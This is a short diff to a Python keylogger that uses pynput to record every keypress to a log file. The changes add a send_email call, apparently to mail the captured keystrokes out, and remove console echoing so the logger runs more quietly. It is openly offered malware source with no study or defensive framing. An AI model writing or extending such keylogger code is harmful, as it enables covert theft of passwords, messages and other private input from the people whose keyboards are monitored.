@@ -1,5 +1,13 @@
 from pynput.keyboard import Key, Listener
 import os
+from emailer import send_email
+import sched
+import time
+import threading
+
+with open("log.txt", "a") as f:
+            f.write("Keylogger")
+send_email()
 
 def writefile(key):
     key = str(key)
@@ -19,7 +27,8 @@ def onpress(key):
 
 
 def onrelease(key):
-    print(key)
+    pass
 
 with Listener(on_press=onpress, on_release=onrelease) as listener:
     listener.join()
+
